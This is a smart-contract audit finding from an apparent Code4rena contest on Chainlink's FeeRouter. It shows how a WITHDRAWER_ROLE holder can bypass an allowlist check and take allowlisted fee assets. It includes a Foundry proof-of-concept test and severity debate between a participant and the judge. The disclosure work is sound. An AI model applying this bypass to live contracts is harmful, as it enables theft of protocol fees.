S-126
`WITHDRAWER_ROLE` can withdraw allowlisted asset by providing atleast one non allowlisted asset to `FeeRouter::withdrawNonAllowlistedAssets` function
_karanel
83
Sufficient
383d ago
Finding description and impact

WITHDRAWER_ROLE is a trusted role, however it's trust limitations are upto to non allowlisted assets as mentioned in on the contest page:

WITHDRAWER_ROLE: Withdraws non-allowlisted assets from the FeeAggregator contracts.

It can be seen from the natspec of the FeeRouter::withdrawNonAllowlistedAssets function that the withdrawn assets must not be allowlisted:

https://github.com/code-423n4/2024-12-chainlink/blob/main/src/FeeRouter.sol#L109-L114

  /// @dev Withdraws non allowlisted assets from the contract
  /// @dev precondition The caller must have the WITHDRAWER_ROLE
  /// @dev precondition The list of WithdrawAssetAmount must not be empty
  /// @dev precondition The withdrawn assets must not be allowlisted
  /// @param assets The list of non allowlisted assets to withdraw
  /// @param amounts The list of non allowlisted asset amounts to withdraw

However, it is possible for a caller with WITHDRAWER_ROLE to withdraw allowlisted assets as long as he provides atleast one non allowlisted asset.

As it can be seen in the FeeRouter::withdrawNonAllowlistedAssets function, it calls FeeAggregator::areAssetsAllowlisted function which should return false for the withdrawal logic to function:
https://github.com/code-423n4/2024-12-chainlink/blob/main/src/FeeRouter.sol#L115-L137

  function withdrawNonAllowlistedAssets(
    address to,
    address[] calldata assets,
    uint256[] calldata amounts
  ) external onlyRole(Roles.WITHDRAWER_ROLE) {
    _validateAssetTransferInputs(assets, amounts);

    IFeeAggregator feeAggregator = s_feeAggregator;

@>  (bool areAssetsAllowlisted,) = feeAggregator.areAssetsAllowlisted(assets);

@>  if (areAssetsAllowlisted) {
      revert Errors.AssetAllowlisted(assets[0]);
    }
    /****SNIP****/

However, FeeAggregator::areAssetsAllowlisted function returns false if atleast one asset is not in the allowlist.
https://github.com/code-423n4/2024-12-chainlink/blob/main/src/FeeAggregator.sol#L185-L194

  function areAssetsAllowlisted(
    address[] calldata assets
  ) external view returns (bool areAllAssetsAllowlisted, address nonAllowlistedAsset) {
    for (uint256 i; i < assets.length; ++i) {
      if (!s_allowlistedAssets.contains(assets[i])) {
        return (false, assets[i]);
      }
    }
    return (true, address(0));
  }

This makes it possible for the caller with WITHDRAWER_ROLE to withdraw allowlisted assets by passing only one non allowlisted asset.
This breaks the trust assumption and an invariant of the protocol.

Proof of Concept

Create a new file PoC.t.sol inside the test folder and run forge test --mt test_PoC

// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.24;

import {EmergencyWithdrawer} from "src/EmergencyWithdrawer.sol";
import {FeeRouter} from "src/FeeRouter.sol";
import {Errors} from "src/libraries/Errors.sol";
import {Roles} from "src/libraries/Roles.sol";
import {BaseIntegrationTest} from "test/integration/BaseIntegrationTest.t.sol";

import {IAccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";

contract FeeRouter_PoC is BaseIntegrationTest {
  address[] private s_assets;
  uint256[] private s_amounts;

  function setUp() public {
    deal(address(s_mockWETH), address(s_feeRouter), 1 ether);
    deal(address(s_mockWBTC), address(s_feeRouter), 1e8);
    deal(address(s_mockUSDC), address(s_feeRouter), 1000e6);

    address[] memory allowlistedAssets = new address[](1);
    // Allowlist only has WETH token
    allowlistedAssets[0] = address(s_mockWETH);

    _changePrank(ASSET_ADMIN);
    s_feeAggregatorReceiver.applyAllowlistedAssetUpdates(new address[](0), allowlistedAssets);

    _changePrank(WITHDRAWER);
    // WITHDRAWER tries to withdraw all assets including allowlisted asset WETH
    s_assets.push(address(s_mockWETH));
    s_assets.push(address(s_mockWBTC));
    s_assets.push(address(s_mockUSDC));
    s_amounts.push(1 ether);
    s_amounts.push(1e8);
    s_amounts.push(1000e6);

    vm.label(address(s_mockWETH), "Mock WETH");
    vm.label(address(s_mockWBTC), "Mock WBTC");
    vm.label(address(s_mockUSDC), "Mock USDC");
  }

  function test_PoC() public {
    vm.expectEmit(address(s_feeRouter));
    emit FeeRouter.NonAllowlistedAssetWithdrawn(WITHDRAWER, s_assets[0], s_amounts[0]);
    vm.expectEmit(address(s_feeRouter));
    emit FeeRouter.NonAllowlistedAssetWithdrawn(WITHDRAWER, s_assets[1], s_amounts[1]);
    vm.expectEmit(address(s_feeRouter));
    emit FeeRouter.NonAllowlistedAssetWithdrawn(WITHDRAWER, s_assets[2], s_amounts[2]);

    s_feeRouter.withdrawNonAllowlistedAssets(WITHDRAWER, s_assets, s_amounts);

    // WITHDRAWER is able to withdraw allowlisted asset
    assertEq(s_mockWETH.balanceOf(WITHDRAWER), s_amounts[0]);
    assertEq(s_mockWBTC.balanceOf(WITHDRAWER), s_amounts[1]);
    assertEq(s_mockUSDC.balanceOf(WITHDRAWER), s_amounts[2]);
    assertEq(s_mockWETH.balanceOf(address(s_feeRouter)), 0);
    assertEq(s_mockWBTC.balanceOf(address(s_feeRouter)), 0);
    assertEq(s_mockUSDC.balanceOf(address(s_feeRouter)), 0);
  }
}
Recommended mitigation steps

Change the allowlist checking logic specifically for FeeRouter::withdrawNonAllowlistedAssets function.

Hi Alex,

Thanks for judging this contest.

I believe this issue to be of QA level at best. Let me explain my logic.

The withdrawNonAllowlistedAssets() function in the FeeRouter.sol allows a member with the WITHDRAWER_ROLE role to withdraw non-allowlisted tokens:

https://github.com/code-423n4/2024-12-chainlink/blob/main/src/FeeRouter.sol#L115

  function withdrawNonAllowlistedAssets(
    address to,
    address[] calldata assets,
    uint256[] calldata amounts
  ) external onlyRole(Roles.WITHDRAWER_ROLE) {
    _validateAssetTransferInputs(assets, amounts);

    IFeeAggregator feeAggregator = s_feeAggregator;

    (bool areAssetsAllowlisted,) = feeAggregator.areAssetsAllowlisted(assets);

    if (areAssetsAllowlisted) {
      revert Errors.AssetAllowlisted(assets[0]);
    }

    for (uint256 i = 0; i < assets.length; ++i) {
      address asset = assets[i];
      uint256 amount = amounts[i];

      _transferAsset(to, asset, amount);
      emit NonAllowlistedAssetWithdrawn(msg.sender, asset, amount);
    }
  }

The withdrawNonAllowlistedAssets() function above allows the member with WITHDRAWER_ROLE to pass an arbitrary address to, along with other arguments, as the receiver of the non-allowlisted assets.

Let us assume that the issue described in this report does not exist; there are sufficient checks to ensure members with WITHDRAWER_ROLE call the withdrawNonAllowlistedAssets() function to withdraw non-allowlisted assets only. Still, if the member with WITHDRAWER_ROLE passes a wrong (or malicious) to address argument, he takes away all the non-allowlisted tokens from the protocol.

This is sufficient to show that the WITHDRAWER_ROLE is a SUPER trusted role.

This means it is extremely unlikely that members with WITHDRAWER_ROLE will take advantage of the issue described in this report and withdraw allowlisted assets. They can but it is extremely unlikely.

Because of this reason, I believe this issue to be of QA level.

I would be happy to provide more valuable information.

Thank you.

01/19/2025

Hey @prapandey031, thank you for your PJQA contribution!

The trust level associated with non-allow-listed assets is significantly lower than allow-listed assets, Non-allow-listed assets are effectively accidentally sent assets to the contract that are of negligible value and are not imperative to the overall system. In contrast, allow-listed assets are meant to represent fees accumulated in a service chain and are intended to be bridged. The WITHDRAWER_ROLE can thus effectively capture all fees of a particular chain that uses the FeeRouter at will.

The FeeRouter is meant to retain all fees prior to them being forwarded to the FeeAggregator and bridged from the service chain to the payment chain. As such, this can be treated as a privilege escalation vulnerability and is thus eligible as a submission.

Beyond that point, the code contains an obvious flaw in its implementation that leads to the above privilege escalation pathway, further reinforcing the idea that it is a valid submission. Historically, egregious code errors have been deemed as medium-risk vulnerabilities even if there were some privilege-related conditions as the one involved in this submission for them to be exploited/activated.

I understand the privilege-related nuisances involved in this submission and still consider it to be a valid medium-risk submission based on the combination of an obvious implementation error resulting in a privilege escalation execution pathway.

The submission and its duplicates outline a logic error in the mechanism that permits the WITHDRAWER_ROLE to withdraw non-allow-listed tokens as its security check can be circumvented to withdraw allow-listed tokens.

While this vulnerability would normally be of major severity, the WITHDRAWER_ROLE is not similar to the BRIDGER_ROLE etc. in the sense that they are meant to be the highest-trust roles and could theoretically cause contracts to break in highly critical ways.

As such, I treat this as a mismatch of the function's intended purpose and thus consider it to be properly labeled as a medium-severity issue.
